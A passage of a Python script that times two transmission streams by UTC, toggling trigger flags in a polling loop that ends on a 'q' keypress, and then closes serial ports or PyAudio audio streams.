              ', Next prep: ' + TxPreparationUTCTime2.strftime("%H:%M:%S") +
              ', Expected Tx2: ' + TxUTCTime2.strftime("%H:%M:%S"))

    # Flag transmission for stream 1
    if ((UTCTimeMicroseconds > 600000) and (UTCTimeMicroseconds < 700000) and 
           (TriggerTx1 == False) and (UTCTime >= TxUTCTime1)):
        TriggerTx1 = True
    elif ((UTCTimeMicroseconds > 800000) and TriggerTx1):
        TriggerTx1 = False

    # Flag transmission for stream 2
    if ((UTCTimeMicroseconds > 600000) and (UTCTimeMicroseconds < 700000) and 
           (TriggerTx2 == False) and (UTCTime >= TxUTCTime2) and (Tx2State > 0)):
        TriggerTx2 = True
    elif ((UTCTimeMicroseconds > 800000) and TriggerTx2):
        TriggerTx2 = False

    # Wait for 20ms
    sleep(0.02)
    
    try:  # used try so that if user pressed other than the given key error will not be shown
        if keyboard.is_pressed('q'):  # if key 'q' is pressed 
            break  # finishing the loop
    except:
        print ("Press q to quit")
                
RunTxFunction1 = False
RunTxFunction2 = False 
   
# Close the tranmission channels (Serial/Audio)
if SerialOrAudio == "Serial":
    # Close serial port 1
    ser1.close()
    # Close serial port 2
    ser2.close()
else:
    sleep(1)
    
    # Wait for 1 second and then close audio stream 1
    AudioStream1.stop_stream()
    AudioStream1.close()
    PAudio1.terminate()
    
    # Close audio stream 2
    AudioStream2.stop_stream()
    AudioStream2.close()
    PAudio2.terminate()
